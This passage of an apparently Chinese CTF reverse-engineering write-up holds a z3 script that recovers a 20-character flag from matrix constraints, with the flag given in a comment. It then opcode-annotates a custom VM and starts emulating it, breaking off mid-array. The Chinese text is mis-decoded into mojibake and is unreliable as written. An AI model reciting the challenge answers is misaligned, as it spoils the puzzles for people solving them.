<span class="number">116</span>, </span><br><span class="line">key[<span class="number">5</span>][<span class="number">0</span>] == <span class="number">149</span>, key[<span class="number">5</span>][<span class="number">1</span>] == <span class="number">163</span>, key[<span class="number">5</span>][<span class="number">2</span>] == <span class="number">127</span>, key[<span class="number">5</span>][<span class="number">3</span>] == <span class="number">186</span>, key[<span class="number">5</span>][<span class="number">4</span>] == <span class="number">46</span>, key[<span class="number">5</span>][<span class="number">5</span>] == <span class="number">118</span>, key[<span class="number">5</span>][<span class="number">6</span>] == <span class="number">247</span>, key[<span class="number">5</span>][<span class="number">7</span>] == <span class="number">194</span>, key[<span class="number">5</span>][<span class="number">8</span>] == <span class="number">9</span>, key[<span class="number">5</span>][<span class="number">9</span>] == <span class="number">165</span>, key[<span class="number">5</span>][<span class="number">10</span>] == <span class="number">169</span>, key[<span class="number">5</span>][<span class="number">11</span>] == <span class="number">224</span>, key[<span class="number">5</span>][<span class="number">12</span>] == <span class="number">68</span>, key[<span class="number">5</span>][<span class="number">13</span>] == <span class="number">129</span>, key[<span class="number">5</span>][<span class="number">14</span>] == <span class="number">54</span>, key[<span class="number">5</span>][<span class="number">15</span>] == <span class="number">15</span>, key[<span class="number">5</span>][<span class="number">16</span>] == <span class="number">134</span>, key[<span class="number">5</span>][<span class="number">17</span>] == <span class="number">39</span>, key[<span class="number">5</span>][<span class="number">18</span>] == <span class="number">185</span>, key[<span class="number">5</span>][<span class="number">19</span>] == <span class="number">248</span>, </span><br><span class="line">key[<span class="number">6</span>][<span class="number">0</span>] == <span class="number">245</span>, key[<span class="number">6</span>][<span class="number">1</span>] == <span class="number">159</span>, key[<span class="number">6</span>][<span class="number">2</span>] == <span class="number">64</span>, key[<span class="number">6</span>][<span class="number">3</span>] == <span class="number">241</span>, key[<span class="number">6</span>][<span class="number">4</span>] == <span class="number">163</span>, key[<span class="number">6</span>][<span class="number">5</span>] == <span class="number">116</span>, key[<span class="number">6</span>][<span class="number">6</span>] == <span class="number">4</span>, key[<span class="number">6</span>][<span class="number">7</span>] == <span class="number">15</span>, key[<span class="number">6</span>][<span class="number">8</span>] == <span class="number">126</span>, key[<span class="number">6</span>][<span class="number">9</span>] == <span class="number">170</span>, key[<span class="number">6</span>][<span class="number">10</span>] == <span class="number">10</span>, key[<span class="number">6</span>][<span class="number">11</span>] == <span class="number">110</span>, key[<span class="number">6</span>][<span class="number">12</span>] == <span class="number">251</span>, key[<span class="number">6</span>][<span class="number">13</span>] == <span class="number">169</span>, key[<span class="number">6</span>][<span class="number">14</span>] == <span class="number">252</span>, key[<span class="number">6</span>][<span class="number">15</span>] == <span class="number">99</span>, key[<span class="number">6</span>][<span class="number">16</span>] == <span class="number">199</span>, key[<span class="number">6</span>][<span class="number">17</span>] == <span class="number">188</span>, key[<span class="number">6</span>][<span class="number">18</span>] == <span class="number">149</span>, key[<span class="number">6</span>][<span class="number">19</span>] == <span class="number">72</span>, </span><br><span class="line">key[<span class="number">7</span>][<span class="number">0</span>] == <span class="number">233</span>, key[<span class="number">7</span>][<span class="number">1</span>] == <span class="number">38</span>, key[<span class="number">7</span>][<span class="number">2</span>] == <span class="number">197</span>, key[<span class="number">7</span>][<span class="number">3</span>] == <span class="number">105</span>, key[<span class="number">7</span>][<span class="number">4</span>] == <span class="number">202</span>, key[<span class="number">7</span>][<span class="number">5</span>] == <span class="number">2</span>, key[<span class="number">7</span>][<span class="number">6</span>] == <span class="number">22</span>, key[<span class="number">7</span>][<span class="number">7</span>] == <span class="number">225</span>, key[<span class="number">7</span>][<span class="number">8</span>] == <span class="number">189</span>, key[<span class="number">7</span>][<span class="number">9</span>] == <span class="number">166</span>, key[<span class="number">7</span>][<span class="number">10</span>] == <span class="number">239</span>, key[<span class="number">7</span>][<span class="number">11</span>] == <span class="number">220</span>, key[<span class="number">7</span>][<span class="number">12</span>] == <span class="number">70</span>, key[<span class="number">7</span>][<span class="number">13</span>] == <span class="number">98</span>, key[<span class="number">7</span>][<span class="number">14</span>] == <span class="number">194</span>, key[<span class="number">7</span>][<span class="number">15</span>] == <span class="number">129</span>, key[<span class="number">7</span>][<span class="number">16</span>] == <span class="number">27</span>, key[<span class="number">7</span>][<span class="number">17</span>] == <span class="number">236</span>, key[<span class="number">7</span>][<span class="number">18</span>] == <span class="number">159</span>, key[<span class="number">7</span>][<span class="number">19</span>] == <span class="number">62</span>, </span><br><span class="line">key[<span class="number">8</span>][<span class="number">0</span>] == <span class="number">152</span>, key[<span class="number">8</span>][<span class="number">1</span>] == <span class="number">67</span>, key[<span class="number">8</span>][<span class="number">2</span>] == <span class="number">72</span>, key[<span class="number">8</span>][<span class="number">3</span>] == <span class="number">35</span>, key[<span class="number">8</span>][<span class="number">4</span>] == <span class="number">12</span>, key[<span class="number">8</span>][<span class="number">5</span>] == <span class="number">55</span>, key[<span class="number">8</span>][<span class="number">6</span>] == <span class="number">139</span>, key[<span class="number">8</span>][<span class="number">7</span>] == <span class="number">4</span>, key[<span class="number">8</span>][<span class="number">8</span>] == <span class="number">169</span>, key[<span class="number">8</span>][<span class="number">9</span>] == <span class="number">142</span>, key[<span class="number">8</span>][<span class="number">10</span>] == <span class="number">135</span>, key[<span class="number">8</span>][<span class="number">11</span>] == <span class="number">122</span>, key[<span class="number">8</span>][<span class="number">12</span>] == <span class="number">3</span>, key[<span class="number">8</span>][<span class="number">13</span>] == <span class="number">166</span>, key[<span class="number">8</span>][<span class="number">14</span>] == <span class="number">139</span>, key[<span class="number">8</span>][<span class="number">15</span>] == <span class="number">62</span>, key[<span class="number">8</span>][<span class="number">16</span>] == <span class="number">23</span>, key[<span class="number">8</span>][<span class="number">17</span>] == <span class="number">92</span>, key[<span class="number">8</span>][<span class="number">18</span>] == <span class="number">11</span>, key[<span class="number">8</span>][<span class="number">19</span>] == <span class="number">136</span>, </span><br><span class="line">key[<span class="number">9</span>][<span class="number">0</span>] == <span class="number">96</span>, key[<span class="number">9</span>][<span class="number">1</span>] == <span class="number">141</span>, key[<span class="number">9</span>][<span class="number">2</span>] == <span class="number">38</span>, key[<span class="number">9</span>][<span class="number">3</span>] == <span class="number">124</span>, key[<span class="number">9</span>][<span class="number">4</span>] == <span class="number">139</span>, key[<span class="number">9</span>][<span class="number">5</span>] == <span class="number">43</span>, key[<span class="number">9</span>][<span class="number">6</span>] == <span class="number">15</span>, key[<span class="number">9</span>][<span class="number">7</span>] == <span class="number">119</span>, key[<span class="number">9</span>][<span class="number">8</span>] == <span class="number">30</span>, key[<span class="number">9</span>][<span class="number">9</span>] == <span class="number">252</span>, key[<span class="number">9</span>][<span class="number">10</span>] == <span class="number">255</span>, key[<span class="number">9</span>][<span class="number">11</span>] == <span class="number">123</span>, key[<span class="number">9</span>][<span class="number">12</span>] == <span class="number">223</span>, key[<span class="number">9</span>][<span class="number">13</span>] == <span class="number">200</span>, key[<span class="number">9</span>][<span class="number">14</span>] == <span class="number">21</span>, key[<span class="number">9</span>][<span class="number">15</span>] == <span class="number">117</span>, key[<span class="number">9</span>][<span class="number">16</span>] == <span class="number">231</span>, key[<span class="number">9</span>][<span class="number">17</span>] == <span class="number">9</span>, key[<span class="number">9</span>][<span class="number">18</span>] == <span class="number">239</span>, key[<span class="number">9</span>][<span class="number">19</span>] == <span class="number">222</span>, </span><br><span class="line">key[<span class="number">10</span>][<span class="number">0</span>] == <span class="number">249</span>, key[<span class="number">10</span>][<span class="number">1</span>] == <span class="number">91</span>, key[<span class="number">10</span>][<span class="number">2</span>] == <span class="number">66</span>, key[<span class="number">10</span>][<span class="number">3</span>] == <span class="number">21</span>, key[<span class="number">10</span>][<span class="number">4</span>] == <span class="number">121</span>, key[<span class="number">10</span>][<span class="number">5</span>] == <span class="number">146</span>, key[<span class="number">10</span>][<span class="number">6</span>] == <span class="number">5</span>, key[<span class="number">10</span>][<span class="number">7</span>] == <span class="number">180</span>, key[<span class="number">10</span>][<span class="number">8</span>] == <span class="number">6</span>, key[<span class="number">10</span>][<span class="number">9</span>] == <span class="number">80</span>, key[<span class="number">10</span>][<span class="number">10</span>] == <span class="number">112</span>, key[<span class="number">10</span>][<span class="number">11</span>] == <span class="number">255</span>, key[<span class="number">10</span>][<span class="number">12</span>] == <span class="number">239</span>, key[<span class="number">10</span>][<span class="number">13</span>] == <span class="number">17</span>, key[<span class="number">10</span>][<span class="number">14</span>] == <span class="number">39</span>, key[<span class="number">10</span>][<span class="number">15</span>] == <span class="number">254</span>, key[<span class="number">10</span>][<span class="number">16</span>] == <span class="number">153</span>, key[<span class="number">10</span>][<span class="number">17</span>] == <span class="number">118</span>, key[<span class="number">10</span>][<span class="number">18</span>] == <span class="number">47</span>, key[<span class="number">10</span>][<span class="number">19</span>] == <span class="number">217</span>, </span><br><span class="line">key[<span class="number">11</span>][<span class="number">0</span>] == <span class="number">84</span>, key[<span class="number">11</span>][<span class="number">1</span>] == <span class="number">96</span>, key[<span class="number">11</span>][<span class="number">2</span>] == <span class="number">190</span>, key[<span class="number">11</span>][<span class="number">3</span>] == <span class="number">188</span>, key[<span class="number">11</span>][<span class="number">4</span>] == <span class="number">255</span>, key[<span class="number">11</span>][<span class="number">5</span>] == <span class="number">181</span>, key[<span class="number">11</span>][<span class="number">6</span>] == <span class="number">188</span>, key[<span class="number">11</span>][<span class="number">7</span>] == <span class="number">124</span>, key[<span class="number">11</span>][<span class="number">8</span>] == <span class="number">47</span>, key[<span class="number">11</span>][<span class="number">9</span>] == <span class="number">70</span>, key[<span class="number">11</span>][<span class="number">10</span>] == <span class="number">201</span>, key[<span class="number">11</span>][<span class="number">11</span>] == <span class="number">160</span>, key[<span class="number">11</span>][<span class="number">12</span>] == <span class="number">126</span>, key[<span class="number">11</span>][<span class="number">13</span>] == <span class="number">210</span>, key[<span class="number">11</span>][<span class="number">14</span>] == <span class="number">236</span>, key[<span class="number">11</span>][<span class="number">15</span>] == <span class="number">22</span>, key[<span class="number">11</span>][<span class="number">16</span>] == <span class="number">120</span>, key[<span class="number">11</span>][<span class="number">17</span>] == <span class="number">181</span>, key[<span class="number">11</span>][<span class="number">18</span>] == <span class="number">197</span>, key[<span class="number">11</span>][<span class="number">19</span>] == <span class="number">69</span>, </span><br><span class="line">key[<span class="number">12</span>][<span class="number">0</span>] == <span class="number">51</span>, key[<span class="number">12</span>][<span class="number">1</span>] == <span class="number">173</span>, key[<span class="number">12</span>][<span class="number">2</span>] == <span class="number">216</span>, key[<span class="number">12</span>][<span class="number">3</span>] == <span class="number">143</span>, key[<span class="number">12</span>][<span class="number">4</span>] == <span class="number">41</span>, key[<span class="number">12</span>][<span class="number">5</span>] == <span class="number">174</span>, key[<span class="number">12</span>][<span class="number">6</span>] == <span class="number">184</span>, key[<span class="number">12</span>][<span class="number">7</span>] == <span class="number">189</span>, key[<span class="number">12</span>][<span class="number">8</span>] == <span class="number">111</span>, key[<span class="number">12</span>][<span class="number">9</span>] == <span class="number">133</span>, key[<span class="number">12</span>][<span class="number">10</span>] == <span class="number">79</span>, key[<span class="number">12</span>][<span class="number">11</span>] == <span class="number">36</span>, key[<span class="number">12</span>][<span class="number">12</span>] == <span class="number">99</span>, key[<span class="number">12</span>][<span class="number">13</span>] == <span class="number">140</span>, key[<span class="number">12</span>][<span class="number">14</span>] == <span class="number">120</span>, key[<span class="number">12</span>][<span class="number">15</span>] == <span class="number">144</span>, key[<span class="number">12</span>][<span class="number">16</span>] == <span class="number">80</span>, key[<span class="number">12</span>][<span class="number">17</span>] == <span class="number">231</span>, key[<span class="number">12</span>][<span class="number">18</span>] == <span class="number">187</span>, key[<span class="number">12</span>][<span class="number">19</span>] == <span class="number">107</span>, </span><br><span class="line">key[<span class="number">13</span>][<span class="number">0</span>] == <span class="number">173</span>, key[<span class="number">13</span>][<span class="number">1</span>] == <span class="number">39</span>, key[<span class="number">13</span>][<span class="number">2</span>] == <span class="number">151</span>, key[<span class="number">13</span>][<span class="number">3</span>] == <span class="number">161</span>, key[<span class="number">13</span>][<span class="number">4</span>] == <span class="number">139</span>, key[<span class="number">13</span>][<span class="number">5</span>] == <span class="number">233</span>, key[<span class="number">13</span>][<span class="number">6</span>] == <span class="number">143</span>, key[<span class="number">13</span>][<span class="number">7</span>] == <span class="number">205</span>, key[<span class="number">13</span>][<span class="number">8</span>] == <span class="number">170</span>, key[<span class="number">13</span>][<span class="number">9</span>] == <span class="number">125</span>, key[<span class="number">13</span>][<span class="number">10</span>] == <span class="number">209</span>, key[<span class="number">13</span>][<span class="number">11</span>] == <span class="number">54</span>, key[<span class="number">13</span>][<span class="number">12</span>] == <span class="number">128</span>, key[<span class="number">13</span>][<span class="number">13</span>] == <span class="number">134</span>, key[<span class="number">13</span>][<span class="number">14</span>] == <span class="number">55</span>, key[<span class="number">13</span>][<span class="number">15</span>] == <span class="number">246</span>, key[<span class="number">13</span>][<span class="number">16</span>] == <span class="number">157</span>, key[<span class="number">13</span>][<span class="number">17</span>] == <span class="number">57</span>, key[<span class="number">13</span>][<span class="number">18</span>] == <span class="number">42</span>, key[<span class="number">13</span>][<span class="number">19</span>] == <span class="number">195</span>, </span><br><span class="line">key[<span class="number">14</span>][<span class="number">0</span>] == <span class="number">5</span>, key[<span class="number">14</span>][<span class="number">1</span>] == <span class="number">49</span>, key[<span class="number">14</span>][<span class="number">2</span>] == <span class="number">235</span>, key[<span class="number">14</span>][<span class="number">3</span>] == <span class="number">8</span>, key[<span class="number">14</span>][<span class="number">4</span>] == <span class="number">84</span>, key[<span class="number">14</span>][<span class="number">5</span>] == <span class="number">9</span>, key[<span class="number">14</span>][<span class="number">6</span>] == <span class="number">219</span>, key[<span class="number">14</span>][<span class="number">7</span>] == <span class="number">90</span>, key[<span class="number">14</span>][<span class="number">8</span>] == <span class="number">109</span>, key[<span class="number">14</span>][<span class="number">9</span>] == <span class="number">164</span>, key[<span class="number">14</span>][<span class="number">10</span>] == <span class="number">38</span>, key[<span class="number">14</span>][<span class="number">11</span>] == <span class="number">159</span>, key[<span class="number">14</span>][<span class="number">12</span>] == <span class="number">218</span>, key[<span class="number">14</span>][<span class="number">13</span>] == <span class="number">214</span>, key[<span class="number">14</span>][<span class="number">14</span>] == <span class="number">22</span>, key[<span class="number">14</span>][<span class="number">15</span>] == <span class="number">205</span>, key[<span class="number">14</span>][<span class="number">16</span>] == <span class="number">7</span>, key[<span class="number">14</span>][<span class="number">17</span>] == <span class="number">57</span>, key[<span class="number">14</span>][<span class="number">18</span>] == <span class="number">210</span>, key[<span class="number">14</span>][<span class="number">19</span>] == <span class="number">131</span>, </span><br><span class="line">key[<span class="number">15</span>][<span class="number">0</span>] == <span class="number">107</span>, key[<span class="number">15</span>][<span class="number">1</span>] == <span class="number">67</span>, key[<span class="number">15</span>][<span class="number">2</span>] == <span class="number">107</span>, key[<span class="number">15</span>][<span class="number">3</span>] == <span class="number">141</span>, key[<span class="number">15</span>][<span class="number">4</span>] == <span class="number">129</span>, key[<span class="number">15</span>][<span class="number">5</span>] == <span class="number">250</span>, key[<span class="number">15</span>][<span class="number">6</span>] == <span class="number">97</span>, key[<span class="number">15</span>][<span class="number">7</span>] == <span class="number">3</span>, key[<span class="number">15</span>][<span class="number">8</span>] == <span class="number">26</span>, key[<span class="number">15</span>][<span class="number">9</span>] == <span class="number">215</span>, key[<span class="number">15</span>][<span class="number">10</span>] == <span class="number">119</span>, key[<span class="number">15</span>][<span class="number">11</span>] == <span class="number">213</span>, key[<span class="number">15</span>][<span class="number">12</span>] == <span class="number">255</span>, key[<span class="number">15</span>][<span class="number">13</span>] == <span class="number">183</span>, key[<span class="number">15</span>][<span class="number">14</span>] == <span class="number">229</span>, key[<span class="number">15</span>][<span class="number">15</span>] == <span class="number">1</span>, key[<span class="number">15</span>][<span class="number">16</span>] == <span class="number">27</span>, key[<span class="number">15</span>][<span class="number">17</span>] == <span class="number">9</span>, key[<span class="number">15</span>][<span class="number">18</span>] == <span class="number">88</span>, key[<span class="number">15</span>][<span class="number">19</span>] == <span class="number">59</span>, </span><br><span class="line">key[<span class="number">16</span>][<span class="number">0</span>] == <span class="number">57</span>, key[<span class="number">16</span>][<span class="number">1</span>] == <span class="number">72</span>, key[<span class="number">16</span>][<span class="number">2</span>] == <span class="number">91</span>, key[<span class="number">16</span>][<span class="number">3</span>] == <span class="number">96</span>, key[<span class="number">16</span>][<span class="number">4</span>] == <span class="number">125</span>, key[<span class="number">16</span>][<span class="number">5</span>] == <span class="number">105</span>, key[<span class="number">16</span>][<span class="number">6</span>] == <span class="number">94</span>, key[<span class="number">16</span>][<span class="number">7</span>] == <span class="number">235</span>, key[<span class="number">16</span>][<span class="number">8</span>] == <span class="number">138</span>, key[<span class="number">16</span>][<span class="number">9</span>] == <span class="number">39</span>, key[<span class="number">16</span>][<span class="number">10</span>] == <span class="number">145</span>, key[<span class="number">16</span>][<span class="number">11</span>] == <span class="number">130</span>, key[<span class="number">16</span>][<span class="number">12</span>] == <span class="number">126</span>, key[<span class="number">16</span>][<span class="number">13</span>] == <span class="number">147</span>, key[<span class="number">16</span>][<span class="number">14</span>] == <span class="number">254</span>, key[<span class="number">16</span>][<span class="number">15</span>] == <span class="number">179</span>, key[<span class="number">16</span>][<span class="number">16</span>] == <span class="number">181</span>, key[<span class="number">16</span>][<span class="number">17</span>] == <span class="number">183</span>, key[<span class="number">16</span>][<span class="number">18</span>] == <span class="number">216</span>, key[<span class="number">16</span>][<span class="number">19</span>] == <span class="number">211</span>, </span><br><span class="line">key[<span class="number">17</span>][<span class="number">0</span>] == <span class="number">164</span>, key[<span class="number">17</span>][<span class="number">1</span>] == <span class="number">205</span>, key[<span class="number">17</span>][<span class="number">2</span>] == <span class="number">28</span>, key[<span class="number">17</span>][<span class="number">3</span>] == <span class="number">160</span>, key[<span class="number">17</span>][<span class="number">4</span>] == <span class="number">233</span>, key[<span class="number">17</span>][<span class="number">5</span>] == <span class="number">70</span>, key[<span class="number">17</span>][<span class="number">6</span>] == <span class="number">109</span>, key[<span class="number">17</span>][<span class="number">7</span>] == <span class="number">51</span>, key[<span class="number">17</span>][<span class="number">8</span>] == <span class="number">0</span>, key[<span class="number">17</span>][<span class="number">9</span>] == <span class="number">71</span>, key[<span class="number">17</span>][<span class="number">10</span>] == <span class="number">99</span>, key[<span class="number">17</span>][<span class="number">11</span>] == <span class="number">163</span>, key[<span class="number">17</span>][<span class="number">12</span>] == <span class="number">37</span>, key[<span class="number">17</span>][<span class="number">13</span>] == <span class="number">98</span>, key[<span class="number">17</span>][<span class="number">14</span>] == <span class="number">46</span>, key[<span class="number">17</span>][<span class="number">15</span>] == <span class="number">44</span>, key[<span class="number">17</span>][<span class="number">16</span>] == <span class="number">138</span>, key[<span class="number">17</span>][<span class="number">17</span>] == <span class="number">135</span>, key[<span class="number">17</span>][<span class="number">18</span>] == <span class="number">191</span>, key[<span class="number">17</span>][<span class="number">19</span>] == <span class="number">144</span>, </span><br><span class="line">key[<span class="number">18</span>][<span class="number">0</span>] == <span class="number">13</span>, key[<span class="number">18</span>][<span class="number">1</span>] == <span class="number">240</span>, key[<span class="number">18</span>][<span class="number">2</span>] == <span class="number">143</span>, key[<span class="number">18</span>][<span class="number">3</span>] == <span class="number">53</span>, key[<span class="number">18</span>][<span class="number">4</span>] == <span class="number">75</span>, key[<span class="number">18</span>][<span class="number">5</span>] == <span class="number">23</span>, key[<span class="number">18</span>][<span class="number">6</span>] == <span class="number">26</span>, key[<span class="number">18</span>][<span class="number">7</span>] == <span class="number">224</span>, key[<span class="number">18</span>][<span class="number">8</span>] == <span class="number">31</span>, key[<span class="number">18</span>][<span class="number">9</span>] == <span class="number">199</span>, key[<span class="number">18</span>][<span class="number">10</span>] == <span class="number">182</span>, key[<span class="number">18</span>][<span class="number">11</span>] == <span class="number">220</span>, key[<span class="number">18</span>][<span class="number">12</span>] == <span class="number">130</span>, key[<span class="number">18</span>][<span class="number">13</span>] == <span class="number">61</span>, key[<span class="number">18</span>][<span class="number">14</span>] == <span class="number">170</span>, key[<span class="number">18</span>][<span class="number">15</span>] == <span class="number">130</span>, key[<span class="number">18</span>][<span class="number">16</span>] == <span class="number">253</span>, key[<span class="number">18</span>][<span class="number">17</span>] == <span class="number">240</span>, key[<span class="number">18</span>][<span class="number">18</span>] == <span class="number">182</span>, key[<span class="number">18</span>][<span class="number">19</span>] == <span class="number">9</span>, </span><br><span class="line">key[<span class="number">19</span>][<span class="number">0</span>] == <span class="number">245</span>, key[<span class="number">19</span>][<span class="number">1</span>] == <span class="number">96</span>, key[<span class="number">19</span>][<span class="number">2</span>] == <span class="number">170</span>, key[<span class="number">19</span>][<span class="number">3</span>] == <span class="number">79</span>, key[<span class="number">19</span>][<span class="number">4</span>] == <span class="number">249</span>, key[<span class="number">19</span>][<span class="number">5</span>] == <span class="number">16</span>, key[<span class="number">19</span>][<span class="number">6</span>] == <span class="number">121</span>, key[<span class="number">19</span>][<span class="number">7</span>] == <span class="number">6</span>, key[<span class="number">19</span>][<span class="number">8</span>] == <span class="number">7</span>, key[<span class="number">19</span>][<span class="number">9</span>] == <span class="number">69</span>, key[<span class="number">19</span>][<span class="number">10</span>] == <span class="number">212</span>, key[<span class="number">19</span>][<span class="number">11</span>] == <span class="number">133</span>, key[<span class="number">19</span>][<span class="number">12</span>] == <span class="number">52</span>, key[<span class="number">19</span>][<span class="number">13</span>] == <span class="number">20</span>, key[<span class="number">19</span>][<span class="number">14</span>] == <span class="number">225</span>, key[<span class="number">19</span>][<span class="number">15</span>] == <span class="number">102</span>, key[<span class="number">19</span>][<span class="number">16</span>] == <span class="number">228</span>, key[<span class="number">19</span>][<span class="number">17</span>] == <span class="number">121</span>, key[<span class="number">19</span>][<span class="number">18</span>] == <span class="number">56</span>, key[<span class="number">19</span>][<span class="number">19</span>] == <span class="number">208</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">sum</span>[i] += flag[j] * key[i][j]</span><br><span class="line">s.add(<span class="built_in">sum</span>[<span class="number">0</span>] == <span class="number">217114</span>, <span class="built_in">sum</span>[<span class="number">1</span>] == <span class="number">270581</span>, <span class="built_in">sum</span>[<span class="number">2</span>] == <span class="number">291585</span>, <span class="built_in">sum</span>[<span class="number">3</span>] == <span class="number">234325</span>, <span class="built_in">sum</span>[<span class="number">4</span>] == <span class="number">240502</span>, <span class="built_in">sum</span>[<span class="number">5</span>] == <span class="number">277604</span>, <span class="built_in">sum</span>[<span class="number">6</span>] == <span class="number">286168</span>, <span class="built_in">sum</span>[<span class="number">7</span>] == <span class="number">290450</span>, <span class="built_in">sum</span>[<span class="number">8</span>] == <span class="number">179355</span>, <span class="built_in">sum</span>[<span class="number">9</span>] == <span class="number">272487</span>, <span class="built_in">sum</span>[<span class="number">10</span>] == <span class="number">249816</span>, <span class="built_in">sum</span>[<span class="number">11</span>] == <span class="number">305636</span>, <span class="built_in">sum</span>[<span class="number">12</span>] == <span class="number">276217</span>, <span class="built_in">sum</span>[<span class="number">13</span>] == <span class="number">294166</span>, <span class="built_in">sum</span>[<span class="number">14</span>] == <span class="number">237236</span>, <span class="built_in">sum</span>[<span class="number">15</span>] == <span class="number">242008</span>, <span class="built_in">sum</span>[<span class="number">16</span>] == <span class="number">289929</span>, <span class="built_in">sum</span>[<span class="number">17</span>] == <span class="number">221788</span>, <span class="built_in">sum</span>[<span class="number">18</span>] == <span class="number">268459</span>, <span class="built_in">sum</span>[<span class="number">19</span>] == <span class="number">247407</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(m[flag[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]))</span><br><span class="line">    <span class="comment"># have_fun_in_vm_hahaa</span></span><br></pre></td></tr></table></figure>



<h2 id="ezvm-vmre"><a href="#ezvm-vmre" class="headerlink" title="ezvm | vmre"></a>ezvm | vmre</h2><p>ä¸ä¸Šä¸€ä¸ªvmä¸åŒçš„æ˜¯å¼•å…¥äº†å¯„å­˜å™¨å’Œflagä½ é‡‡ç”¨å‡½æ•°è¡¨çš„æ–¹å¼å­˜æ”¾op è¿˜æ˜¯å…ˆå¼„æ‡‚æ¯ä¸ªopçš„å«ä¹‰ ç„¶åæ¨¡æ‹Ÿå‡ºåŠ å¯†è¿‡ç¨‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># emulate the procees of vm</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">op_1_extract_v_from_reg_by_hb</span></span><br><span class="line"><span class="string">op_1_extract_v_from_reg_by_lb</span></span><br><span class="line"><span class="string">op_2_save_in_reg_by_hb</span></span><br><span class="line"><span class="string">op_3_nop                      ; pt += 1</span></span><br><span class="line"><span class="string">op_4_add                      ; reg[hb] += reg[lb]</span></span><br><span class="line"><span class="string">op_5_minus                    ; reg[hb] -= reg[lb]</span></span><br><span class="line"><span class="string">op_6_mul                      ; reg[hb] *= reg[lb]</span></span><br><span class="line"><span class="string">op_7_div                      ; reg[hb] /= reg[lb]</span></span><br><span class="line"><span class="string">op_8_inc                      ; reg[hb] += 1</span></span><br><span class="line"><span class="string">op_9_dec                      ; reg[hb] -= 1</span></span><br><span class="line"><span class="string">op_10_xor                     ; reg[hb] ^= reg[lb]</span></span><br><span class="line"><span class="string">op_11_and                     ; reg[hb] &amp;= reg[lb]</span></span><br><span class="line"><span class="string">op_12_pop_in                  ; pop reg[hb] in stack</span></span><br><span class="line"><span class="string">op_13                         ; ç»„åˆop[9]æ¥ä¸‹æ¥çš„4ä¸ªæ•°æ®(å¤§ç«¯åº)å¹¶å…¥æ ˆ</span></span><br><span class="line"><span class="string">op_14                         ; esp += 4</span></span><br><span class="line"><span class="string">op_15                         ; reg[hb] = reg[lb]</span></span><br><span class="line"><span class="string">op_16                         ; reg[hb] = input[k]</span></span><br><span class="line"><span class="string">op_17                         ; input[k] = reg[hb]</span></span><br><span class="line"><span class="string">op_18                         ; check reg[3]:reg[3] = 1 -&gt; *op[9] -= *(op[9] + 1)</span></span><br><span class="line"><span class="string">op_19                         ; set reg[4]:reg[4] = sign of (reg[hb] - reg[lb])</span></span><br><span class="line"><span class="string">op_20                         ; check reg[4]:reg[4] == -1 -&gt; op[9] += 2 + *(op[9] + 1) else += 2</span></span><br><span class="line"><span class="string">op_21                         ; anti-op_20, reg[4] == 1</span></span><br><span class="line"><span class="string">op_22                         ; else reg[4] == 0</span></span><br><span class="line"><span class="string">op_23                         ; k++</span></span><br><span class="line"><span class="string">op_24                         ; k--</span></span><br><span class="line"><span class="string">op_25                         ; *(op[9] + i) ^= 0x66 for i in range(1, 16)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stack = [<span class="number">0</span>] * <span class="number">0x100</span></span><br><span class="line">input_text = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">input</span>()]</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">reg = [<span class="number">0</span>] * <span class="number">5</span></span><br><span class="line">esp = <span class="built_in">len</span>(stack) - <span class="number">1</span></span><br><span class="line">opcode = [<span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, </span><br><span class="line">  <span class="number">0x73</span>, <span class="number">0x10</span>, <span class="number">0x67</span>, <span class="number">0x01</span>, <span class="number">0x7B</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x75</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x7B</span>, <span class="number">0x75</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0x10</span>, <span class="number">0x7A</span>, </span><br><span class="line">  <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x66</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0x0C</span>, <span class="number">0xE5</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xAF</span>, <span class="number">0xCD</span>, <span class="number">0x67</span>, <span class="number">0xBF</span>, <span class="number">0x1F</span>, <span class="number">0xBF</span>, <span class="number">0x1E</span>, <span class="number">0x68</span>, </span><br><span class="line">  <span class="number">0xFE</span>, 